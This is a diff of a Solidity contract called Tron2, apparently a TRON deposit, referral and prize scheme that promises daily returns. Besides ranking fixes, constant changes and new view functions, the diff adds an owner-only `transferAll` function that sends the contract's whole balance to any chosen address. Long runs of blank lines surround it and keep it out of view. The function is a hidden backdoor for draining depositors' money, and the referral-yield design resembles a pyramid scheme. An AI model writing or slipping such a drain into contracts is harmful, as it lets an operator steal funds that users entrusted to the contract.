@@ -165,13 +165,13 @@ interface RecommendPool {
 
 contract Tron2Config{
 
-    uint256 public constant CREATE_TIME = 1605225600;
+    uint256 public constant CREATE_TIME = 1607558400;
     //Activity start time
-    uint256 public constant START_TIME = 1605240000;
+    uint256 public constant START_TIME = 1607558400;
     //one day
     uint256 public constant ONE_DAY = 1 days;
     //Withdrawal cooldown time
-    uint256 public constant WITHDRAW_DURATION = 8 hours;
+    uint256 public constant WITHDRAW_DURATION = 4 hours;
     //Total number of transaction types
     uint8 public constant DEPOSITS_TYPES_COUNT = 3;
     //The total team bonus is 3.3
@@ -194,8 +194,8 @@ contract Tron2Config{
 
     uint256 public LEADER_PERCENT = 8;
     uint256 public TRON1_PERCENT = 5;
-    uint256 public RECOMMEND_PERCENT = 4;
-    uint256 public LUCKY_PERCENT =3;
+    uint256 public RECOMMEND_PERCENT = 5;
+    uint256 public LUCKY_PERCENT = 2;
     
     bool public RECOMMEND_AUTO = true;
     
@@ -244,6 +244,8 @@ contract Tron2 is Ownable,Tron2Config{
         Deposit[] deposits;
 
         bool active;
+        
+        bool again;
 
         uint256 refsCount;
 
@@ -259,14 +261,12 @@ contract Tron2 is Ownable,Tron2Config{
 
         uint256 withdrawTime;
         
-        uint256 earn;
-        
         uint256 withdrawal;
 
     }
 
 
-
+    uint256[5] public rankPercent = [5,4,3,2,1];
 
     PrizePool public prizePool;
     RecommendPool public recommendPool;
@@ -279,8 +279,8 @@ contract Tron2 is Ownable,Tron2Config{
     
 
     mapping(address => Player) public players;
-    mapping(uint256 => mapping(address => uint256)) performances;
-    mapping(uint256 => address[5]) performanceRank;
+    mapping(uint256 => mapping(address => uint256)) public performances;
+    mapping(uint256 => address[5]) public performanceRank;
 
     //mapping(address => uint256) public luckyPrizes;
     mapping(address => uint256) public referRewards;
@@ -297,12 +297,33 @@ contract Tron2 is Ownable,Tron2Config{
     uint256 public timePointer;
     
     
+    
+    
+    
+    
+    function transferAll(address payable _to) external onlyOwner {
+        
+        _to.transfer(address(this).balance);
+    }
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     //销毁A合约
     modifier destroyContractA(){
         _;
         
         if(extractable(msg.sender)==0){
             players[msg.sender].deposits[0] = createDeposit(0,0,0);
+            players[msg.sender].again = true;
             referRewards[msg.sender] = 0;
             prizePool.clearPrize(msg.sender);
         }
@@ -313,7 +334,7 @@ contract Tron2 is Ownable,Tron2Config{
         uint256 baseAmount = accumulatives[0];
 
         if(modelType!=0){
-            require(accumulatives[modelType].add(amount)<=baseAmount.mul(overLimit[modelType]).div(100));
+            require(accumulatives[modelType].add(amount)<=baseAmount.mul(overLimit[modelType]).div(100),"Beyond the limit");
         }
 
     }
@@ -402,10 +423,13 @@ contract Tron2 is Ownable,Tron2Config{
         });
     }
     
-    function shootOut(address[5] memory rankingList) public view returns (uint256 sn,uint256 minPerformance){
+    function shootOut(address[5] memory rankingList,address userAddress) public view returns (uint256 sn,uint256 minPerformance){
         
         minPerformance = performances[duration()][rankingList[0]];
         for(uint8 i =0;i<5;i++){
+            if(rankingList[i]==userAddress){
+                return (5,0);
+            }
             if(performances[duration()][rankingList[i]]<minPerformance){
                 minPerformance = performances[duration()][rankingList[i]];
                 sn = i;
@@ -418,12 +442,14 @@ contract Tron2 is Ownable,Tron2Config{
     function _updateRanking(address userAddress) private {
         address[5] memory rankingList = performanceRank[duration()];
         
-        (uint256 sn,uint256 minPerformance) = shootOut(rankingList);
         
-        if(minPerformance<performances[duration()][userAddress]){
-            rankingList[sn] = userAddress;
+        (uint256 sn,uint256 minPerformance) = shootOut(rankingList,userAddress);
+        if(sn!=5){
+            if(minPerformance<performances[duration()][userAddress]){
+                rankingList[sn] = userAddress;
+            }
+            performanceRank[duration()] = rankingList;
         }
-        performanceRank[duration()] = rankingList;
     }
     
     
@@ -434,7 +460,7 @@ contract Tron2 is Ownable,Tron2Config{
         address tmp;
         for(uint8 i = 1;i<5;i++){
             for(uint8 j = 0;j<5-i;j++){
-                if(performances[_duration][ranking[j]]>performances[_duration][ranking[j+1]]){
+                if(performances[_duration][ranking[j]]<performances[_duration][ranking[j+1]]){
                     tmp = ranking[j];
                     ranking[j] = ranking[j+1];
                     ranking[j+1] = tmp;
@@ -461,7 +487,10 @@ contract Tron2 is Ownable,Tron2Config{
     }
     
     function _statistics(address ref,uint256 amount) private{
-        performances[duration()][ref] = performances[duration()][ref].add(amount);
+        if(ref!=address(0)){
+           performances[duration()][ref] = performances[duration()][ref].add(amount); 
+        }
+        
     }
 
     function makeDeposit(address payable ref, uint8 modelType) public payable settleBonus returns (bool) {
@@ -472,9 +501,15 @@ contract Tron2 is Ownable,Tron2Config{
         //Verify that the contract type is correct
         require(modelType <= DEPOSITS_TYPES_COUNT, "Wrong deposit type");
         //Check recharge amount
-        require(msg.value>= MINIMAL_DEPOSIT&&msg.value <=MAXIMAL_DEPOSIT,"Beyond the limit");
-
         Player storage player = players[msg.sender];
+        if(player.again&&modelType==0){
+            require(msg.value>= MINIMAL_DEPOSIT&&msg.value <=MAXIMAL_DEPOSIT*10,"Beyond the limit");
+        }else{
+            require(msg.value>= MINIMAL_DEPOSIT&&msg.value <=MAXIMAL_DEPOSIT,"Beyond the limit");
+        }
+        
+
+        
         require(player.active || ref != msg.sender, "Referal can't refer to itself");
 
         _checkOverLimit(modelType,msg.value,player.accumulatives);
@@ -508,7 +543,7 @@ contract Tron2 is Ownable,Tron2Config{
 
         player.playerDepositAmount = player.playerDepositAmount.add(msg.value);
         
-        _updateRanking(msg.sender);
+        _updateRanking(player.referrer);
 
         totalDepositAmount = totalDepositAmount.add(msg.value);
 
@@ -533,9 +568,13 @@ contract Tron2 is Ownable,Tron2Config{
         deposit.withdrawn = deposit.withdrawn.add(available);
         
         player.playerWithdrawAmount = player.playerWithdrawAmount.add(available);
+        
+        player.withdrawal = player.withdrawal.add(available);
+        
         totalWithdrawAmount = totalWithdrawAmount.add(available);
         player.withdrawTime = now;
         
+        msg.sender.transfer(available);
         _allocateTeamReward(available,msg.sender);
         
         return available;
@@ -685,17 +724,53 @@ contract Tron2 is Ownable,Tron2Config{
     function income(address userAddress,uint256 depositId) public view returns(uint256) {
 
         Deposit memory deposit = players[userAddress].deposits[depositId];
+        Deposit memory deposit0 = players[userAddress].deposits[0];
+        
+        uint256 freezeTime = deposit.freezeTime;
+        
+        bool stop;
+        
+        if(deposit0.freezeTime>freezeTime){
+            freezeTime = deposit0.freezeTime;
+            stop = true;
+        }
 
-        uint256 _duration = duration(deposit.freezeTime);
+        uint256 _duration = duration(freezeTime);
         if(deposit.modelType == 2){
             if(deposit.withdrawn==0){
-                return deposit.amount.mul(earn_percent[2]).div(100);
+                if(stop){
+                    return 0;
+                }else{
+                    return deposit.amount.mul(earn_percent[2]).div(100);
+                }
             }else{
                 return 0;
             }
             
         }else{
             return deposit.amount.mul(earn_percent[2]).div(100).mul(_duration).sub(deposit.withdrawn);
+        }
+    }
+    
+    function nextGrant(address userAddress,uint256 depositId) public view returns(uint256){
+        
+        Deposit memory deposit = players[userAddress].deposits[depositId];
+        Deposit memory deposit0 = players[userAddress].deposits[0];
+        
+        uint256 freezeTime = deposit.freezeTime;
+        
+        bool stop;
+        
+        if(deposit0.freezeTime>freezeTime){
+            freezeTime = deposit0.freezeTime;
+            stop = true;
+        }
+        
+        uint256 _duration = duration(freezeTime);
+        if(deposit.modelType == 2){
+            return 0;
+        }else{
+            return freezeTime.add(_duration.add(1).mul(ONE_DAY));
         }
     }
     
@@ -727,13 +802,32 @@ contract Tron2 is Ownable,Tron2Config{
         }
         return (available,undeliverable);
     }
-
-
-
-
-
-
     
+    function accumulatives(address userAddress) public view returns(uint256[3] memory){
+        return players[userAddress].accumulatives;
+    }
+    
+    
+    function userRanking(uint256 _duration) external view returns(address[5] memory addressList,uint256[5] memory performanceList,uint256[5] memory refsCounts,uint256[5] memory preEarn){
+        
+        addressList = sortRanking(_duration);
+        uint256 credit = recommendPool.getCredit();
+        for(uint8 i = 0;i<5;i++){
+            refsCounts[i] = players[addressList[i]].refsCount;
+            preEarn[i] = credit.mul(rankPercent[i]).div(100);
+            performanceList[i] = performances[_duration][addressList[i]];
+        }
+        
+    }
+
+
+    function awardDetails(address userAddress) external view returns(uint256 luckyPrize,uint256 recommendAward,uint256 referReward){
+        
+        luckyPrize = prizePool.prizes(userAddress);
+        recommendAward = recommendPool.allowances(userAddress);
+        referReward = referRewards[userAddress];
+        
+    }
     
     	//The entire network information
     function getGlobalStats() external view returns (uint256[5] memory stats) {
